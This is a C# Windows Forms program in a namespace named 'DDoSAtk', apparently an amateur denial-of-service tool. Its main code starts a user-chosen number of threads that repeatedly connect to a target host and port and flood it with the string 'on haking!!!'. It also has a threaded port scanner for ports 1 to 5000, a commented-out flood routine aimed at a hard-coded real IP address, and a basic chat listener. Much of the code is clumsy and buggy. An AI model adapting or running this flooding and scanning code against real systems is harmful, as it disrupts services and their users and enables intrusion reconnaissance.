using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Diagnostics;
using System.Threading;
using System.Net.Sockets;
using System.Net;
using System.IO;
using Microsoft.Win32;
using Microsoft.Internal.Performance;
namespace DDoSAtk
{

    public partial class Form1 : Form
    {

        public Form1()
        {
            InitializeComponent();

        }
        ~Form1()
        {
           
            for (int i = 0; i != t.Length; )
            {
                t[i].Abort();

                i++;
            }
            Application.ExitThread();
        }
        #region webview
        private void button1_Click(object sender, EventArgs e)
        {
            try
            {
                webBrowser1.Url = new Uri(textBox1.Text);
            }
            catch
            {
                MessageBox.Show("mistake url");
            }
        }

        private void webBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {
            label1.Text = "url:" + webBrowser1.Url.ToString();
        }
        #endregion
        #region otherPower
        private void button7_Click(object sender, EventArgs e)
        {
            Process p = new Process();
            try
            {
                p.StartInfo.FileName = "C:/Windows/system32/cmd.exe";
                p.Start();
            }
            catch
            {
                MessageBox.Show("cmd not exeists!");
            }
        }



        private void button8_Click(object sender, EventArgs e)
        {
            Process p = new Process();
            try
            {
                p.StartInfo.FileName = "C:/Program Files (x86)/Internet Explorer/iexplower.exe";
                p.Start();
            }
            catch
            {
                MessageBox.Show("ie not exeists!");
            }
        }
        //void fak()
        //{
        //    TcpClient tcpc = new TcpClient("163.20.142.2", 80);
        // NetworkStream nws  =    tcpc.GetStream();
        //    res:
        //    nws.Write (Encoding .ASCII .GetBytes ("blablabla"),0,Encoding .ASCII .GetByteCount("blablabla"));
        //    goto res;
        //}
        private void Form1_Load(object sender, EventArgs e)
        {
            Control.CheckForIllegalCrossThreadCalls = false;
            this.FormClosing += new FormClosingEventHandler(Form1_FormClosing);

            //for (int i = 0; i != 50; )
            //{
            //    Thread t = new Thread(new ThreadStart(fak));
            //    t.Start();

            //}









        }

        void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            //throw new NotImplementedException();
            Application.ExitThread();
        }
        #endregion
        #region attack
        #region val
        int sqare(int sqrs)
        {
            int it = 0;
            it = 10;
            int send = it;
            for (int i = 0; i != sqrs; )
            {
                send = send * 10;




                i++;
            }





            return send;
        }
        int Val(string integer)
        {

            int bakI = 0; char[] carr = new char[100];
            carr = integer.ToCharArray(); char[] Ocrr = new char[carr.Length];
            for (int i = 0; i != Ocrr.Length; )
            {
                Ocrr[i] = carr[Ocrr.Length - i - 1];



                i++;
            }
            for (int i = 0; i != Ocrr.Length; )
            {
                if (Ocrr[i] == '0')
                {
                    //   bakI += 0 *sqare (i) * 10 ;
                }
                else
                {
                    if (Ocrr[i] == '1')
                    {
                        bakI += sqare(i);
                    }
                    else
                    {
                        if (Ocrr[i] == '2')
                        {
                            bakI += 2 * sqare(i);
                        }
                        else
                        {
                            if (Ocrr[i] == '3')
                            {
                                bakI += 3 * sqare(i);
                            }
                            else
                            {
                                if (Ocrr[i] == '4')
                                {
                                    bakI += 4 * sqare(i);
                                }
                                else
                                {
                                    if (Ocrr[i] == '5')
                                    {
                                        bakI += 5 * sqare(i);
                                    }
                                    else
                                    {
                                        if (Ocrr[i] == '6')
                                        {
                                            bakI += 6 * sqare(i);
                                        }
                                        else
                                        {
                                            if (Ocrr[i] == '7')
                                            {
                                                bakI += 7 * sqare(i);
                                            }
                                            else
                                            {
                                                if (Ocrr[i] == '8')
                                                {
                                                    bakI += 8 * sqare(i);
                                                }
                                                else
                                                {
                                                    if (Ocrr[i] == '9')
                                                    {
                                                        bakI += 9 * sqare(i);
                                                    }
                                                    else
                                                    {
                                                        //          MessageBox.Show("wrong number");
                                                        i = 1000;
                                                        throw new ArgumentException("XXX");
                                                    }

                                                }

                                            }

                                        }

                                    }

                                }

                            }

                        }

                    }

                }
                i++;
            }
            return bakI / 10;
        }
        #endregion

        //time
        bool endT = false;
        int time = 0;
        int nowTime = 0;

        bool bye = true;
        //messages
        int messages = 0;
        //  int i = 0;
        //always
        short threads = 0;
        short type = 0;
        short finishThr = 0;
        Thread[] t;
        int port = 0;

        private void button2_Click(object sender, EventArgs e)
        {

            if (radioButton1.Checked == true)
            {
                nowTime = 0;
                endT = true;
                time = 0;

                type = 1;
                try
                {
                    // time = Val(textBox13.Text);
                    threads = (short)Val(textBox12.Text);
                    port = Val(textBox10.Text);
                    time = Val(textBox13.Text);
                }
                catch
                {
                    MessageBox.Show("please enter RIGHT number"); goto end;
                }

                t = new Thread[threads]; MessageBox.Show("this will probality delay for couple minutes");
                button2.Enabled = false;
                button3.Enabled = true;
                finishThr = 0;
                for (int i = 0; i != threads; )
                {
                    t[i] = new Thread(new ThreadStart(attacking));
                    t[i].Start();
                    i++;
                }
            }
            else
            {
                if (radioButton2.Checked == true)
                {
                    type = 2;
                    button2.Enabled = false;
                    button3.Enabled = true;
                    finishThr = 0;

                    try
                    {
                        // time = Val(textBox13.Text);
                        bye = false;
                        messages = Val(textBox14.Text);
                        threads = (short)Val(textBox12.Text);
                        port = Val(textBox10.Text);
                        // time = Val(textBox13.Text);

                    }
                    catch
                    {
                        MessageBox.Show("please enter RIGHT number"); goto end;
                    }

                    t = new Thread[threads]; MessageBox.Show("this will probality delay for couple minutes");
                    button2.Enabled = false;
                    button3.Enabled = true;
                    finishThr = 0;
                    for (int i = 0; i != threads; )
                    {
                        t[i] = new Thread(new ThreadStart(attacking));
                        t[i].Start();
                        i++;
                    }
                }
                else
                {
                    if (radioButton3.Checked == true)
                    {
                        type = 3;
                        button2.Enabled = false;
                        button3.Enabled = true;
                        finishThr = 0;
                        try
                        {
                            // time = Val(textBox13.Text);
                            //  messages = Val(textBox13.Text);
                            threads = (short)Val(textBox12.Text);
                            port = Val(textBox10.Text);
                            // time = Val(textBox13.Text);

                        }
                        catch
                        {
                            MessageBox.Show("please enter RIGHT number"); goto end;
                        }

                        t = new Thread[threads]; MessageBox.Show("this will probality delay for couple minutes");
                        button2.Enabled = false;
                        button3.Enabled = true;
                        finishThr = 0;
                        for (int i = 0; i != threads; )
                        {
                            t[i] = new Thread(new ThreadStart(attacking));
                            t[i].Start();
                            i++;
                        }
                    }
                    else
                    {

                        MessageBox.Show("enter a kind of attack");

                    }
                }
            }
        //    bool fend = false;
        end:
            if (false == false)
            {
            }
            else
            {
                goto end;
            }


        }
        bool dead = false;
        void attacking()
        {

            if (type == 1)
            {

                //  Socket s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                //    s.Bind ((EndPoint )(new IPEndPoint (IPAddress .Parse ("120.102.225.12" ), 80)));
                /*    TcpListener l = new TcpListener(IPAddress .Parse ("192.168.0.2"), 100);*/
                TcpClient tcpc;
            retry:
                try
                {
                    tcpc = new TcpClient();
                }
                catch
                {
                    goto retry;
                }












                NetworkStream nws = tcpc.GetStream();
                byte[] bfr = Encoding.ASCII.GetBytes("on haking!!!");
                // int myI = 0;
                do
                {
                    //time
                    //attack code

                    try
                    {
                        tcpc.Connect(textBox2.Text, port);
                        nws.Write(bfr, 0, bfr.Length);
                    }
                    catch
                    {
                        if (!dead)
                        {
                            //MessageBox.Show("dead");
                            dead = true;
                        }
                        //  tcpc = new TcpClient(textBox2.Text, port); nws = tcpc.GetStream();
                    }
                    //  s.Send(bfr);











                } while (!endT);
                reOnAtk();
            }

            if (type == 2)
            {

                TcpClient tcpc;
            retry:
                try
                {
                    tcpc = new TcpClient(textBox2.Text, port);
                }
                catch
                {
                    goto retry;
                }

                NetworkStream nws = tcpc.GetStream();
                byte[] bfr = Encoding.ASCII.GetBytes("on haking!!!");
                // int myI = 0;
                do
                {
                    //time
                    //attack code
                    i++;
                    try
                    {
                        nws.Write(bfr, 0, bfr.Length);
                    }
                    catch
                    {
                        if (!dead)
                        {
                            //MessageBox.Show("dead");
                            dead = true;
                        }
                        //  tcpc = new TcpClient(textBox2.Text, port); nws = tcpc.GetStream();
                    }
                    //  s.Send(bfr);
                    if (i == messages)
                    {
                        bye = true;
                    }










                } while (bye);
























            }
            if (type == 3)
            {
                TcpClient sender; NetworkStream nws = null;
                try
                {
                    // Socket s = new Socket(AddressFamily.InterNetwork , SocketType.Stream, ProtocolType.Tcp);
                    sender = new TcpClient((textBox2.Text), port); nws = sender.GetStream();
                }
                catch { }
                //s.Bind((EndPoint)(new IPEndPoint(IPAddress.Parse(textBox2.Text), port)));
                byte[] bfr = Encoding.ASCII.GetBytes("on haking!!!");
                // int myI = 0;
                do
                {
                    //time
                    //attack code

                    try
                    {
                        nws.Write(bfr, 0, bfr.Length);
                    }
                    catch
                    {
                        if (!dead)
                        {
                           /* MessageBox.Show("dead");*/
                            dead = true;
                        }
                    }

                    //    s.Send(bfr);













                } while (true);

                reOnAtk();
            }






        }
        private void timer1_Tick(object sender, EventArgs e)
        {
            if (nowTime == time)
            {
                endT = false;
            }
            nowTime++;
        }
        void reOnAtk()
        {
            finishThr++;
            if (finishThr == threads)
            {
                //MessageBox.Show("finish");
                button2.Enabled = true;
                button3.Enabled = false;
                MessageBox.Show("OK");
            }
        }


        private void button3_Click(object sender, EventArgs e)
        {
            button3.Enabled = false;
            button2.Enabled = true;
            for (int i = 0; i != threads; )
            {
                t[i].Abort();
                i++;
            }
        }
        #endregion


        #region find
        string findIP = "";
        int findThread = 0;
        Thread[] findT;
        int findport;
        int i = 0;
        private void button5_Click(object sender, EventArgs e)
        {
            i = 0;
            findIP = textBox5.Text;
            try
            {

                findThread = Val(textBox11.Text);
            }
            catch
            {

                MessageBox.Show("mistake num");
                goto end;
            }
            findT = new Thread[findThread];
            MessageBox.Show("only find until port 5000");
            for (int i2 = 0; i2 != findThread; )
            {
                findT[i2] = new Thread(new ThreadStart(finding));
                findT[i2].Start();



                //  MessageBox.Show("::");
                i2++;
            }





        end:
            if (false == false)
            {


            }
            else
            {
                goto end;
            }


        }
        void finding()
        {
        restart:
            i++;
            int myI = 0;
            myI = i;
            bool ok = false;
            try
            {
                ok = true;
                TcpClient tcpc = new TcpClient();
                tcpc.Connect(findIP, myI);





            }
            catch
            {
                ok = false;

            }
            if (ok == true)
            {
                listBox1.Items.Add(myI);
            }
            if (i == 5000)
            {

                MessageBox.Show("five thouthand");

            }

            goto restart;








        }

    
        private void button13_Click(object sender, EventArgs e)
        {
            listBox1.Items.Clear();
        }
        #endregion
        #region chat
        Thread listent;
        int p = 0;
        private void button11_Click(object sender, EventArgs e)
        {
            listent = new Thread(new ThreadStart(listen2));
            listent.Start();








        }
        string getIP()
        {
            string ip = "";
            // Socket s = new Socket (
            IPAddress[] ipa = Dns.GetHostAddresses(Dns.GetHostName());
            foreach (IPAddress it in ipa)
            {
                if (it.AddressFamily == AddressFamily.InterNetwork)
                {
                    ip = it.ToString();
                }



            }





            return ip;
        }
   

        void listen()
        {
            TcpListener tcpl = new TcpListener(IPAddress.Parse(getIP()), 10);//exception here
          
                try
                {
                    tcpl = new TcpListener(IPAddress.Parse(getIP()), Val(textBox3.Text));
                }
                catch
                {
                    MessageBox.Show("port is using or enter right number");
                    goto end;
                }
            
            tcpl.Start();
            
            
            
        res:
            Socket s = tcpl.AcceptSocket();
            byte[] bfr = new byte[10000];
            s.Receive(bfr);
            listBox3.Items.Add(Encoding.Default.GetString(bfr));





            goto res;

        end:


            if (false)
            {
                goto end;
            }
        }
        void listen2()
        {
            TcpListener tcpl = new TcpListener(IPAddress.Parse(getIP()), 10);//exception here
          
                try
                {
                    tcpl = new TcpListener(IPAddress.Parse(getIP()), p);

                }
                catch
                {
                    MessageBox.Show("port is using or enter right number");
                    goto end;
                }
            
           
                tcpl = new TcpListener(IPAddress.Parse(getIP()),Val(textBox16 .Text ));
            tcpl.Start(); 
            MessageBox.Show("Start");
            Socket s = tcpl.AcceptSocket();
        res:
           
            byte[] bfr = new byte[10000];
            s.Receive(bfr);
            listBox3.Items.Add(Encoding.Default.GetString(bfr));





            goto res;

        end:


            if (false)
            {
                goto end;
            }


        }
        TcpClient chatMouse = new TcpClient(); NetworkStream nws; bool first = true;
        private void button12_Click(object sender, EventArgs e)
        {
            if (first)
            {
                int port = 0;
                try
                {
                    port = Val(textBox3.Text);
                    chatMouse.Connect(textBox8.Text, port);
                  MessageBox.Show(((IPEndPoint)(chatMouse.Client.LocalEndPoint)).Port.ToString());
                    //  Thread t = new Thread(new ThreadStart(listen2)); t.Start();
                    p = port;
                }
                catch
                {
                    MessageBox.Show("error port ");
                    goto end;
                }
                nws = chatMouse.GetStream(); first = false;
            }
            nws.Write(Encoding.Default.GetBytes(textBox9.Text), 0, textBox9.Text.Length);
            MessageBox.Show("sent");

        end:


            if (false)
            {

                goto end;
            }
        }
        #endregion


   

   




    }
}
